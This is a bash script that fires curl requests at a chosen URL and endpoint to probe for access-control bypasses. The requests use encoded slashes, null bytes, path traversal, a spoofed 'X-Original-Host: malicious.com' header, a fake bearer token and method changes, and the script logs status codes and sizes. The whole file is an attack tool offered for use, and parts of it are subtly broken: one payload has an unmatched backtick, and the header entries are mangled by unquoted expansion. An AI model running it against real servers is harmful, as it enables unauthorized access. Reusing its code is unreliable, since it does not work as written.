#!/bin/bash

if [ $# -ne 2 ]; then
    echo "Usage: $0 <base_url> <endpoint>"
    exit 1
fi

declare -a curl_payloads=(
    "$1/$2%5c"
    "$1/$2%2F"
    "$1/$2+"
    "-H \"Range: bytes=0-10\" $1/$2"
    "-H \"Accept-Encoding: gzip,deflate\" $1/$2"
    "-H \"X-Original-Host: malicious.com\" $1/$2"
    "$1/$2`"
    "-X PATCH $1/$2"
    "-H \"Authorization: Bearer some_token\" $1/$2"
    "$1/%09$2"
    "$1/$2%00"
    "$1/$2,%00"
    "$1/$2/..//..//"
    "$1/$2/?v=1/"
    "-H \"Connection: Upgrade\" -H \"Upgrade: websocket\" $1/$2"
    "-H \"If-None-Match: some-etag-value\" $1/$2"
    "$1/$2~"
    "-H \"X-Forwarded-Proto: https\" $1/$2"
    "-H \"Accept: */*\" $1/$2"
    "-H \"Expect: 100-continue\" $1/$2"
)

for payload in "${curl_payloads[@]}"; do
    curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" $payload
    echo "  --> $payload"
done
